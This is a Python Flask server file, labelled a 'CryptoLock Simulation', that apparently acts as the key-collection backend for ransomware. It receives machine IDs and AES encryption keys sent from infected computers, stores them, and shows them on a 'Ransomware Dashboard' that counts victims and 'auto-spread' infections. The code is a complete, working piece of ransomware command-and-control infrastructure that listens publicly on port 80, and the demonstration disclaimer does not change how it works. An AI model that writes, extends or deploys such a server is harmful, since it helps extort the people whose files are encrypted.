# dashboard_server.py
# Simple Flask dashboard to receive and display AES keys and machine IDs

from flask import Flask, request, jsonify, render_template_string
import threading

app = Flask(__name__)
received_data = []

@app.route('/', methods=['POST'])
def receive_key():
    data = request.get_json()
    machine_id = data.get('machine_id')
    encryption_key = data.get('encryption_key')
    # Only add if not already present
    if not any(d['machine_id'] == machine_id for d in received_data):
        received_data.append({'machine_id': machine_id, 'encryption_key': encryption_key})
    return jsonify({'status': 'success'})

@app.route('/', methods=['GET'])
def dashboard():
    html = '''
    <html>
    <head>
        <title>Ransomware Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; background: #181c20; color: #f2f2f2; }
            h2 { color: #ff5252; }
            table { border-collapse: collapse; width: 80%; margin: 20px 0; background: #23272b; }
            th, td { border: 1px solid #444; padding: 10px; text-align: center; }
            th { background: #2d333b; color: #ffb300; }
            tr:nth-child(even) { background: #20232a; }
            tr:hover { background: #333842; }
            .count { font-size: 1.5em; color: #00e676; }
            .footer { margin-top: 30px; color: #888; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <h2>Ransomware Dashboard</h2>
        <p>Total Victims (Auto-Spread Count): <span class="count">{{count}}</span></p>
        <table>
            <tr>
                <th>Machine ID</th>
                <th>AES Encryption Key</th>
            </tr>
            {% for entry in data %}
            <tr>
                <td>{{entry.machine_id}}</td>
                <td style="font-family:monospace;">{{entry.encryption_key}}</td>
            </tr>
            {% endfor %}
        </table>
        <div class="footer">
            &copy; 2024 CryptoLock Simulation | For demonstration purposes only.
        </div>
    </body>
    </html>
    '''
    return render_template_string(html, data=received_data, count=len(received_data))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
